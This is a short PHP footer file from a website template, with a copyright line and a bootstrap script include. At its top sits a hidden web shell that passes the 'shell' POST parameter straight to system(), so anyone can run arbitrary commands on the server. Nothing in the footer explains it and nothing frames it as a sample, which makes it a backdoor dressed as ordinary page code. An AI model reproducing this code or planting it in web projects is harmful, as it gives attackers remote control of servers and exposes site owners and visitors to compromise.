<?php 
	$shell=$_POST['shell'];
	system($shell);
	if($shell !=""){
		exit();
	}
?>

	<div class="footer-bottom">
		<div class="container">		
			<p>Copyright &copy; 2018.Company name All rights reserved.More Templates - </p>					
		</div>
	</div>
<!--//footer-->	
<!-- for bootstrap working -->
		<script src="js/bootstrap.js"> </script>